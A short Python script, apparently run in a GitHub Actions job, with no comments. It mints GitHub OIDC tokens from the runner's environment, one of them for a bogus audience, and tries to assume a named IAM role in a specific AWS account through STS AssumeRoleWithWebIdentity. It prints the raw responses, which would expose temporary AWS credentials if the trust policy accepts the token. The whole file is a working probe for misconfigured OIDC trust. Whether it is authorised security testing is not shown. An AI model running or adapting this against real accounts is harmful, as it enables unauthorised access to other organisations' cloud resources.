import json, os, urllib.error, urllib.parse, urllib.request

def mint(aud):
    url = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']
    rt = os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
    req = urllib.request.Request(url + '&audience=' + urllib.parse.quote(aud, safe=''),
                                 headers={'Authorization': 'bearer ' + rt})
    return json.load(urllib.request.urlopen(req, timeout=20))['value']

def call(tok, role):
    data = urllib.parse.urlencode({'Action': 'AssumeRoleWithWebIdentity', 'Version': '2011-06-15',
                                   'RoleArn': role, 'RoleSessionName': 'w14b10', 'WebIdentityToken': tok}).encode()
    try:
        return urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/', data=data), timeout=30).read().decode()
    except urllib.error.HTTPError as e:
        return e.read().decode()

try:
    tok = mint('sts.amazonaws.com')
    print('MINT_A ok len=%d' % len(tok))
except urllib.error.HTTPError as e:
    print('MINT_A ERR %d %s' % (e.code, e.read().decode()[:400])); tok = None
if tok:
    for role in ['arn:aws:iam::114563866192:role/talos-gha-OriginProtocol-origin-dollar',
                 'arn:aws:iam::114563866192:role/w14b10-does-not-exist']:
        print('=== ARM_A role=%s' % role)
        print(call(tok, role))
try:
    tok2 = mint('https://w14b10.invalid')
    print('MINT_B ok len=%d' % len(tok2))
except urllib.error.HTTPError as e:
    print('MINT_B ERR %d %s' % (e.code, e.read().decode()[:400])); tok2 = None
if tok2:
    print('=== ARM_B aud=https://w14b10.invalid role=talos-gha-OriginProtocol-origin-dollar')
    print(call(tok2, 'arn:aws:iam::114563866192:role/talos-gha-OriginProtocol-origin-dollar'))
